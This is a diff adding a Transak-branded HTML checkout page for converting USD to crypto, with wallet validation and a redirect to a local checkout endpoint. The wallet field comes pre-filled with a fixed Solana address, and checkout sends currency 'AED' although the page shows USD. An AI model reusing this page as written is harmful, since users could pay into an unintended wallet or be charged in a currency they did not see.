@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transak - Convert Fiat to Crypto</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .section {
+            margin-bottom: 25px;
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #555;
+            margin-bottom: 6px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+            font-family: monospace;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .hint {
+            font-size: 12px;
+            color: #888;
+            margin-top: 4px;
+        }
+
+        .divider {
+            height: 1px;
+            background: #e0e0e0;
+            margin: 25px 0;
+        }
+
+        .summary {
+            background: #f8faff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 13px;
+        }
+
+        .summary-row:last-child {
+            margin-bottom: 0;
+            font-weight: 600;
+            border-top: 1px solid #e0e0e0;
+            padding-top: 8px;
+            margin-top: 8px;
+        }
+
+        .button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .error {
+            color: #e53e3e;
+            font-size: 13px;
+            margin-top: 8px;
+            padding: 8px;
+            background: #fff5f5;
+            border-radius: 4px;
+            display: none;
+        }
+
+        .success {
+            color: #2f855a;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+
+        .row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        @media (max-width: 600px) {
+            .row {
+                grid-template-columns: 1fr;
+            }
+            .header {
+                padding: 20px 20px;
+            }
+            .header h1 {
+                font-size: 20px;
+            }
+        }
+
+        .info-box {
+            background: #f0f4ff;
+            border-left: 4px solid #667eea;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>🚀 Transak</h1>
+                <p>Convert USD to Crypto in 5-10 minutes</p>
+            </div>
+
+            <div class="content">
+                <!-- Order Summary -->
+                <div class="summary">
+                    <div class="summary-row">
+                        <span>You Pay:</span>
+                        <span id="payAmount">$100.00</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>You Receive:</span>
+                        <span id="receiveAmount">≈ 0.05 BTC</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Fee (1%):</span>
+                        <span id="feeAmount">$1.00</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>TOTAL:</span>
+                        <span id="totalAmount">$101.00</span>
+                    </div>
+                </div>
+
+                <!-- Amount & Crypto Selection -->
+                <div class="section">
+                    <div class="section-title">📊 Order Details</div>
+                    <div class="row">
+                        <div class="form-group">
+                            <label for="amount">Amount (USD)</label>
+                            <input type="number" id="amount" placeholder="100.00" min="30" value="100" />
+                            <div class="hint">Min: $30 USD</div>
+                        </div>
+                        <div class="form-group">
+                            <label for="crypto">Receive As</label>
+                            <select id="crypto">
+                                <option value="USDC" selected>USDC (Solana)</option>
+                                <option value="USDT">USDT (Solana)</option>
+                                <option value="SOL">SOL (Native)</option>
+                                <option value="USDC_ETH">USDC (Ethereum)</option>
+                                <option value="USDT_ETH">USDT (Ethereum)</option>
+                                <option value="USDT_TRX">USDT (TRC-20)</option>
+                                <option value="ETH">ETH (Ethereum)</option>
+                                <option value="BTC">BTC (Bitcoin)</option>
+                                <option value="MATIC">MATIC (Polygon)</option>
+                                <option value="BNB">BNB (BSC)</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Contact Info -->
+                <div class="section">
+                    <div class="section-title">👤 Your Details</div>
+                    <div class="form-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" placeholder="you@example.com" />
+                        <div class="hint">For order updates</div>
+                    </div>
+                </div>
+
+                <!-- Wallet Address -->
+                <div class="section">
+                    <div class="section-title">💳 Wallet Address</div>
+                    <div class="info-box">
+                        ⚠️ <strong>Important:</strong> Paste the wallet address where you want to receive crypto. Make sure it matches the selected cryptocurrency.
+                    </div>
+                    <div class="form-group">
+                        <label for="wallet">Wallet Address</label>
+                        <input
+                            type="text"
+                            id="wallet"
+                            value="7T34pXqwy666yjZXuFWNQo6tFVHukNgPdx9VCcf7W8J7"
+                            placeholder="Paste your wallet address here..."
+                            spellcheck="false"
+                        />
+                        <div class="hint" id="walletHint">USDC on Solana: base58 address (44 chars)</div>
+                    </div>
+                </div>
+
+                <!-- Error Message -->
+                <div class="error" id="errorMsg"></div>
+
+                <!-- Submit Button -->
+                <button class="button" id="proceedBtn" disabled>
+                    Proceed to Payment →
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const amountInput = document.getElementById('amount');
+        const cryptoSelect = document.getElementById('crypto');
+        const emailInput = document.getElementById('email');
+        const walletInput = document.getElementById('wallet');
+        const proceedBtn = document.getElementById('proceedBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const walletHint = document.getElementById('walletHint');
+
+        // Wallet address patterns
+        const walletPatterns = {
+            BTC: { regex: /^[13bc][a-zA-HJ-NP-Z0-9]{25,62}$/, hint: 'Bitcoin: starts with 1, 3, or bc1' },
+            ETH: { regex: /^0x[a-fA-F0-9]{40}$/, hint: 'Ethereum/EVM: starts with 0x' },
+            USDT: { regex: /^(0x[a-fA-F0-9]{40}|T[a-zA-Z0-9]{33}|[1-9A-HJ-NP-Za-km-z]{32,44})$/, hint: 'USDT: any supported network' },
+            USDT_ETH: { regex: /^0x[a-fA-F0-9]{40}$/, hint: 'USDT on Ethereum: starts with 0x' },
+            USDT_TRX: { regex: /^T[a-zA-Z0-9]{33}$/, hint: 'USDT on TRON: starts with T' },
+            USDC: { regex: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/, hint: 'USDC on Solana: base58 address' },
+            USDC_ETH: { regex: /^0x[a-fA-F0-9]{40}$/, hint: 'USDC on Ethereum: starts with 0x' },
+            USDC_POLYGON: { regex: /^0x[a-fA-F0-9]{40}$/, hint: 'USDC on Polygon: starts with 0x' },
+            SOL: { regex: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/, hint: 'Solana: base58 address' },
+            MATIC: { regex: /^0x[a-fA-F0-9]{40}$/, hint: 'Polygon: starts with 0x' },
+            BNB: { regex: /^(0x[a-fA-F0-9]{40}|bnb[a-zA-Z0-9]{39})$/, hint: 'BNB: 0x... or bnb...' },
+        };
+
+        // Update on any input
+        amountInput.addEventListener('change', updateUI);
+        amountInput.addEventListener('input', updateUI);
+        cryptoSelect.addEventListener('change', updateUI);
+        emailInput.addEventListener('input', validateForm);
+        walletInput.addEventListener('input', validateForm);
+        cryptoSelect.addEventListener('change', updateWalletHint);
+        proceedBtn.addEventListener('click', proceed);
+
+        function updateWalletHint() {
+            const crypto = cryptoSelect.value;
+            walletHint.textContent = walletPatterns[crypto]?.hint || 'Paste your wallet address';
+        }
+
+        function updateUI() {
+            const amount = parseFloat(amountInput.value) || 0;
+            const fee = amount * 0.01; // 1% fee
+            const total = amount + fee;
+
+            document.getElementById('payAmount').textContent = `$${amount.toFixed(2)}`;
+            document.getElementById('feeAmount').textContent = `$${fee.toFixed(2)}`;
+            document.getElementById('totalAmount').textContent = `$${total.toFixed(2)}`;
+
+            // Estimate crypto amount (rough)
+            const rates = { BTC: 40000, ETH: 2500, USDT: 1, USDC: 1 };
+            const rate = rates[cryptoSelect.value] || 1;
+            const cryptoAmount = amount / rate;
+            document.getElementById('receiveAmount').textContent = `≈ ${cryptoAmount.toFixed(4)} ${cryptoSelect.value}`;
+
+            validateForm();
+        }
+
+        function validateForm() {
+            const amount = parseFloat(amountInput.value) || 0;
+            const email = emailInput.value.trim();
+            const wallet = walletInput.value.trim();
+            const crypto = cryptoSelect.value;
+
+            let isValid = true;
+            let error = '';
+
+            if (amount < 30) {
+                error = '⚠️ Minimum amount is $30 USD';
+                isValid = false;
+            }
+
+            if (email && !email.includes('@')) {
+                error = '⚠️ Invalid email address';
+                isValid = false;
+            }
+
+            if (wallet) {
+                const pattern = walletPatterns[crypto]?.regex;
+                if (!pattern.test(wallet)) {
+                    error = `⚠️ Invalid ${crypto} wallet address`;
+                    isValid = false;
+                }
+            }
+
+            if (!wallet) {
+                error = '⚠️ Wallet address required';
+                isValid = false;
+            }
+
+            proceedBtn.disabled = !isValid;
+            errorMsg.style.display = isValid ? 'none' : 'block';
+            errorMsg.textContent = error;
+        }
+
+        function proceed() {
+            const amount = amountInput.value;
+            const crypto = cryptoSelect.value;
+            const email = emailInput.value;
+            const wallet = walletInput.value.trim();
+
+            if (!wallet) {
+                alert('Please enter wallet address');
+                return;
+            }
+
+            const params = new URLSearchParams({
+                amount: String(amount),
+                currency: 'AED',
+                crypto: crypto,
+                wallet: wallet,
+            });
+            if (email) params.set('email', email);
+
+            window.location.href = '/api/transak/checkout?' + params.toString();
+        }
+
+        // Pre-fill from URL params
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('amount')) amountInput.value = urlParams.get('amount');
+        if (urlParams.get('crypto')) cryptoSelect.value = urlParams.get('crypto');
+        if (urlParams.get('email')) emailInput.value = urlParams.get('email');
+        if (urlParams.get('wallet')) walletInput.value = urlParams.get('wallet');
+        if (urlParams.get('fiat')) document.getElementById('fiatSelect') && (document.getElementById('fiatSelect').value = urlParams.get('fiat').toUpperCase());
+
+        updateUI();
+        updateWalletHint();
+    </script>
+</body>
+</html>
